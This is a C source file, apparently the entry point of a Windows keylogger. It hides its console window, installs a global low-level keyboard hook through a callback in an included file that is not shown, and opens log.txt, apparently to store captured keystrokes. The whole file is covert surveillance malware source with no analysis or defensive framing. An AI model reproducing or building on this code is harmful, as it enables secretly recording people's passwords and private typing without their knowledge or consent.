#include <stdio.h>
#include "src/hooking.c"

int main(int argc, char **argv){
    HWND self = GetConsoleWindow();
    HINSTANCE app = GetModuleHandle(NULL);
    fd = fopen("log.txt", "w");
    MSG msg;

    ShowWindow(self, SW_HIDE);
    SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hooking, app, 0);

    while (GetMessage(&msg, NULL, 0, 0) > 0){
        ShowWindow(self, SW_HIDE);
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    fflush(fd);
    fclose(fd);
    return 0;
}